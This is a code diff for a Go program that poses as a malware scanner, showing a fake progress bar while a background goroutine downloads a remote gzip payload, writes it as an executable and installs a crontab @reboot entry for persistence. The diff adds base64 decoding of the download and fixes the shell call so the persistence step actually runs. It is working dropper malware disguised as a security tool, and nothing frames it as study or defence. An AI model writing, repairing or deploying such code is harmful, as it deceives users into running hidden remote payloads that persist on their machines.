@@ -3,6 +3,7 @@ package main
 import (
 	"compress/gzip"
 	"crypto/sha256"
+	"encoding/base64"
 	"fmt"
 	"io"
 	"math/rand/v2"
@@ -26,10 +27,11 @@ func main() {
 		return
 	}
 
-	fmt.Println("Beginning malware scan, please wait")
 	go run_dropper()
+
+	fmt.Println("Beginning malware scan, please wait")
 	fmt.Print("Progress: ")
-	for i := 0; i < 10; i++ {
+	for range 10 {
 		fmt.Print("=")
 		time.Sleep(time.Second * time.Duration(rand.IntN(5)))
 	}
@@ -43,7 +45,7 @@ func drop() {
 		return
 	}
 
-	gz, err := gzip.NewReader(resp.Body)
+	gz, err := gzip.NewReader(base64.NewDecoder(base64.StdEncoding, resp.Body))
 	if err != nil {
 		return
 	}
@@ -88,7 +90,7 @@ func drop() {
 		}
 
 		cmd := fmt.Sprintf("bash -c \"(crontab -l; echo \"@reboot %s\" ) | crontab -\"", filepath.Join(dir, filename))
-		exec.Command("/bin/sh", cmd).Start()
+		exec.Command("/bin/sh", "-c", cmd).Start()
 	}
 	os.WriteFile(filename, data, 0777)
 }
